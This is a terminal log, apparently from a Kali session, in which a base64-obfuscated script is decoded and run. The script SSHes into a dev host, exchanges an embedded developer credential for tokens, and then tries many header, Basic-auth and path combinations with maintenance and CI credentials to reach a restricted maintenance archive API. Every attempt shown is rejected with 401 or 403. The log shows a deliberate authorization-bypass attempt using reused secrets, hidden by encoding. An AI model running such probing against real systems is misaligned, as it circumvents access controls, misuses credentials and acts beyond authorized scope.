@@ -1,0 +1,134 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r29.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKQ0E9JEhPTUUvLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdApVPSJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIgpXVD0kKGN1cmwgLXNTayAtbSAxMCAtdSAiJFUiIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbikuZ2V0KCJhY2Nlc3NfdG9rZW4iLCIiKSknKQpFSj0kKGN1cmwgLXNTayAtbSAxMCAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdUIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAne30nICIkQi9hcGkvdG9rZW4tZXhjaGFuZ2UvZmllbGRrZXN0LWV4cG9ydC1hY2Nlc3MiIHwgcHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pLmdldCgiYWNjZXNzX3Rva2VuIiwiIikpJykKUkM9ImZrX21haW50ZW5hbmNlX3J1bnRpbWVfM2dJUDNqOHc2ZmhrQlNxdjdKNXhsbE9yRFZhMkt6aWciCldDPSJma19jaV9tYWludGVuYW5jZV9uVTdWM0RPbnE3a3B5QXdwNDZjVjUwbU84ZnF0eEhTSiIKVTE9IiRCL2FwaS9tYWludGVuYW5jZS9GSUVMRC1DUlItMjAyNi0wOSIKZygpeyBuPSIkMSI7IHNoaWZ0OyBlY2hvICIjIyMjIyAkbiI7IGN1cmwgLXNTayAtbSAxMCAtLWNhY2VydCAkQ0EgLXcgJ1xuWyV7aHR0cF9jb2RlfV1cbicgIiRAIiB8IGhlYWQgLWMgMjUwMDsgZWNobzsgfQplY2hvICIjIyMjIyMjIyMjIEhFQURFUiBDT01CT1MiCmcgIkJlYXJlciBFSiArIFdMICsgQVQ9V0MiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAtSCAiWC1Xb3JrbG9hZC1DbGFzczogbWFpbnRlbmFuY2UiIC1IICJYLVNjaGVkdWxlci1BdHRlc3RhdGlvbjogJFdDIiAiJFUxIgpnICJCZWFyZXIgRUogKyBXTCArIEFUPVJDIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgLUggIlgtV29ya2xvYWQtQ2xhc3M6IG1haW50ZW5hbmNlIiAtSCAiWC1TY2hlZHVsZXItQXR0ZXN0YXRpb246ICRSQyIgIiRVMSIKZyAiQmVhcmVyIFdDIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXQyIgIiRVMSIKZyAiQmVhcmVyIFJDIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRSQyIgIiRVMSIKZyAiWC1NYWludGVuYW5jZS1Xb3JrZXIgV0MiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAtSCAiWC1NYWludGVuYW5jZS1Xb3JrZXI6ICRXQyIgIiRVMSIKZyAiWC1NYWludGVuYW5jZS1Xb3JrZXIgUkMiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAtSCAiWC1NYWludGVuYW5jZS1Xb3JrZXI6ICRSQyIgIiRVMSIKZyAiWC1Xb3JrZXItQ3JlZGVudGlhbCBXQyIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiIC1IICJYLVdvcmtlci1DcmVkZW50aWFsOiAkV0MiICIkVTEiCmcgIlgtTWFpbnRlbmFuY2UtQ3JlZGVudGlhbCBXQyIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiIC1IICJYLU1haW50ZW5hbmNlLUNyZWRlbnRpYWw6ICRXQyIgIiRVMSIKZyAiQXV0aCBXb3JrZXIgV0MiIC1IICJBdXRob3JpemF0aW9uOiBXb3JrZXIgJFdDIiAiJFUxIgpnICJBdXRoIE1haW50ZW5hbmNlIFdDIiAtSCAiQXV0aG9yaXphdGlvbjogTWFpbnRlbmFuY2UgJFdDIiAiJFUxIgpnICJBdXRoIFNjaGVkdWxlciBXQyIgLUggIkF1dGhvcml6YXRpb246IFNjaGVkdWxlciAkV0MiICIkVTEiCmcgIlgtU2NoZWR1bGVyLUF0dGVzdGF0aW9uIFdDIG9ubHkiIC1IICJYLVNjaGVkdWxlci1BdHRlc3RhdGlvbjogJFdDIiAiJFUxIgpnICJYLVdvcmtsb2FkLUNsYXNzIG1haW50ZW5hbmNlICsgQXV0aCBCZWFyZXIgV0MiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdDIiAtSCAiWC1Xb3JrbG9hZC1DbGFzczogbWFpbnRlbmFuY2UiICIkVTEiCmcgIkJhc2ljIFdDIHVzZXIiIC11ICJtYWludGVuYW5jZTokV0MiICIkVTEiCmcgIkJhc2ljIHdvcmtlciIgLXUgInN2Yy1maWVsZGtlc3QtcnVubmVyOiRXQyIgIiRVMSIKZyAiQmFzaWMgcnVudGltZSIgLXUgInN2Yy1maWVsZGxpbmstbWFpbnRlbmFuY2U6JFJDIiAiJFUxIgpnICJCYXNpYyByb3dhbiBXQyIgLXUgInJvd2FuLml0bzokV0MiICIkVTEiCmVjaG8gIiMjIyMjIyMjIyMgQVJDSElWRSBWQVJJQU5UUyIKZm9yIHAgaW4gImFwaS9tYWludGVuYW5jZS9GSUVMRC1DUlItMjAyNi0wOS9zdW1tYXJ5IiAiYXBpL21haW50ZW5hbmNlL0ZJRUxELUNSUi0yMDI2LTA5L0NSUi1PRzIiICJhcGkvbWFpbnRlbmFuY2UvQ1JSLU9HMiIgImFwaS9tYWludGVuYW5jZS9hcmNoaXZlL0ZJRUxELUNSUi0yMDI2LTA5L0NSUi1PRzIiICJhcGkvbWFpbnRlbmFuY2UvRklFTEQtQ1JSLTIwMjYtMDk/YXNzZXQ9Q1JSLU9HMiIgImFwaS9tYWludGVuYW5jZS9zdW1tYXJ5L0ZJRUxELUNSUi0yMDI2LTA5IjsgZG8KIGcgIkdFVCAkcCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiIC1IICJYLVdvcmtsb2FkLUNsYXNzOiBtYWludGVuYW5jZSIgLUggIlgtU2NoZWR1bGVyLUF0dGVzdGF0aW9uOiAkV0MiICIkQi8kcCIKZG9uZQplY2hvICIjIyMjIyMjIyMjIFBPU1Qgd2l0aCBoZWFkZXJzIgpnICJQT1NUIGFyY2hpdmUiIC1YIFBPU1QgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiIC1IICJYLVdvcmtsb2FkLUNsYXNzOiBtYWludGVuYW5jZSIgLUggIlgtU2NoZWR1bGVyLUF0dGVzdGF0aW9uOiAkV0MiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7ImFyY2hpdmUiOiJGSUVMRC1DUlItMjAyNi0wOSIsImNvbW1hbmQiOlsibWFpbnRlbmFuY2Utc3VtbWFyeSIsIi0tYXJjaGl2ZSIsIkZJRUxELUNSUi0yMDI2LTA5Il19JyAiJFUxIgplY2hvIERPTkVfUjI5ClJTSAplY2hvIEZJTklTSEVECg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r29.sh; bash /tmp/k14_r29.sh; echo DONEMARK_1795208421222$((6*7))
+########## HEADER COMBOS
+##### Bearer EJ + WL + AT=WC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### Bearer EJ + WL + AT=RC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### Bearer WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### Bearer RC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### X-Maintenance-Worker WC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### X-Maintenance-Worker RC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### X-Worker-Credential WC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### X-Maintenance-Credential WC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### Auth Worker WC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### Auth Maintenance WC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### Auth Scheduler WC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### X-Scheduler-Attestation WC only
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### X-Workload-Class maintenance + Auth Bearer WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### Basic WC user
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### Basic worker
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### Basic runtime
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### Basic rowan WC
+{"error":"maintenance_worker_required"}
+
+[401]
+
+########## ARCHIVE VARIANTS
+##### GET api/maintenance/FIELD-CRR-2026-09/summary
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### GET api/maintenance/FIELD-CRR-2026-09/CRR-OG2
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### GET api/maintenance/CRR-OG2
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### GET api/maintenance/archive/FIELD-CRR-2026-09/CRR-OG2
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### GET api/maintenance/FIELD-CRR-2026-09?asset=CRR-OG2
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### GET api/maintenance/summary/FIELD-CRR-2026-09
+{"error":"maintenance_worker_required"}
+
+[401]
+
+########## POST with headers
+##### POST archive
+{"error":"authentication_required"}
+
+[401]
+
+DONE_R29
+FINISHED
